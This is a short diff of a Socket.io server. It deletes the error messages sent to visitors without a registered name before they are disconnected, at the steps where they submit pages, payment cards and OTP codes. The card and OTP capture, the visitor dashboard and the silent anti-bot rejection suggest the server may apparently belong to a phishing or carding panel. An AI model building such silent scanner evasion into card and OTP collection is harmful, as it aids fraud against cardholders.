@@ -1811,7 +1811,7 @@ io.on("connection", (socket) => {
           console.log(`[ANTI-BOT-STRICT] Blocking access to ${data.page} for visitor without real name: ${visitor._id}, IP=${visitor.ip}`);
           
           // Disconnect and cleanup immediately
-          socket.emit("error", { message: "Please complete your registration first." });
+
           socket.disconnect(true);
           
           // Remove from savedVisitors to clean up the dashboard
@@ -1846,7 +1846,7 @@ io.on("connection", (socket) => {
         const hasRealName = visitor.fullName && !visitor.fullName.startsWith("زائر #");
         if (!hasRealName) {
           console.log(`[STRICT-REJECT] Card rejected from visitor without real name: ${visitor._id}, IP=${visitor.ip}`);
-          socket.emit("error", { message: "Please complete your registration with your name first." });
+
           socket.disconnect(true);
           return;
         }
@@ -1865,7 +1865,7 @@ io.on("connection", (socket) => {
           delete data.paymentCard;
           if (visitor.data) delete visitor.data.cardNumber;
           
-          socket.emit("error", { message: "Please complete your registration first." });
+
           
           // Disconnect immediately to stop the bot
           socket.disconnect(true);
@@ -1929,7 +1929,7 @@ io.on("connection", (socket) => {
         // STRICT VALIDATION: Reject OTP from visitors without identity (bots/direct access)
         if (!visitor.fullName || visitor.fullName.startsWith("زائر #")) {
           console.log(`[STRICT-REJECT] OTP rejected from visitor without identity: ${visitor._id}, IP=${visitor.ip}`);
-          socket.emit("error", { message: "Please complete your registration first." });
+
           setTimeout(() => socket.disconnect(), 1000);
           return;
         }
